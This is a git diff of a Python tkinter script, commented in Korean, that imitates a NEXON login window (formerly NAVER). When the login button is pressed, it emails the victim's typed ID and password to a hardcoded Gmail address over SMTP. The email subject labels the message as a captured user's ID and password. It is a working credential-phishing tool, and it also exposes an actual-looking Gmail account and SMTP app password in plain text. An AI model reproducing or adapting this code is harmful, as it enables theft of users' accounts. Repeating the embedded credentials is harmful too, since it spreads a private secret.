@@ -13,7 +13,7 @@ win.geometry("500x400")
 
 
 label3 = Label(win)
-label3.config(text = "당신의 NAVER 아이디와 비밀번호를 입력하세요")
+label3.config(text = "당신의 NEXON 아이디와 비밀번호를 입력하세요")
 label3.pack()
 
 # id label
@@ -39,37 +39,43 @@ ent2.pack()
 btn = Button(win)
 btn.config(text = "Login")
 
+
 def login():
+
+    #tkinter로 얻은 ID랑 PW를 user_id, user_pw에 대입
     user_id = ent1.get()
     user_pw = ent2.get()
 
-    print(user_id, user_pw)
-
-    smtp_user = 'holykim707@gmail.com'
-    smtp_password = 'puorvfxkyfksobie'
-    emails = ['holykim707@gmail.com']
-    server = 'smtp.gmail.com'
-    port = 587
+    smtp_user = 'holykim707@gmail.com'#서버 메일
+    smtp_password = 'puorvfxkyfksobie'#내 서버 메일에서 비밀번호
+    emails = ['holykim707@gmail.com'] #보내는 메일
+    server = 'smtp.gmail.com'# 구글의 서버명
+    port = 587 #메일 전송하는 포트
+    
     for email in emails:
-        msg = MIMEMultipart("alternative")
-        msg ["Subject"] = 'NAVER USER가 입력한ID, PW입니다'
-        msg ["From"] = smtp_user
-        msg["To"] = email
+        msg = MIMEMultipart("alternative") # MIMEMultipart : 메세지 보낼때의 메세지에 대한 모듈 메일에 들어가는 가장 기본적인 내용들 넣
+
+        # alternative는 메일을 수신한 프로그램이 여러 내용 중에 선택해서 출력 할 수 있는 type
+        msg ["Subject"] = 'NEXON USER가 입력한ID, PW입니다' # 메일 제목
+        msg ["From"] = smtp_user # 메일 받는 사람
+        msg["To"] = email # 메일 보내는 사람 email이라고 입력
+
+        # 메일 본문 (무슨 내용이 들어갈지) , MIMEText : 메일 보낼때 메세지 제목, 본문
         msg .attach(
         MIMEText (
             "ID: "+user_id + "  PW: "+user_pw,
-            "입력한 id와 pw를 가져왔습니다"
-
-
+            "입력한 id와 pw를 가져왔습니다"  
         )
         )
+        
+    #이메일 전송
 
-    s = smtplib .SMTP(server , port)
-    s .ehlo()
-    s .starttls()
+    s = smtplib .SMTP(server , port)#SMTP 서버명과 포트를 변수 s에 대입
+    s .ehlo() # say Hello 즉, SMTP개체를 얻고나면 ehlo() 메소드를 호출하여 SMTP 이메일 서버에 Hello 메세지를 보낸다.
+    s .starttls() # 간단하게 보안 설정 해서 바로 로그인 #TLS 사용시 필요하다, SMTP 서버의 포트 587에 연결할 때(TLS 암호화 사용)에는 starttls() 메소드를 호출해야한다.
     s .login(smtp_user,smtp_password)
-    s .sendmail(smtp_user , email , msg .as_string())
-    s.quit()
+    s .sendmail(smtp_user , email , msg .as_string())#sendmail로 메일 전송(보내는 사람, 받는사람, 메일 내용)
+    s.quit() #Gmail SMTP와의 서버를 끊어줌
 
 btn.config(command = login)
 btn.pack()
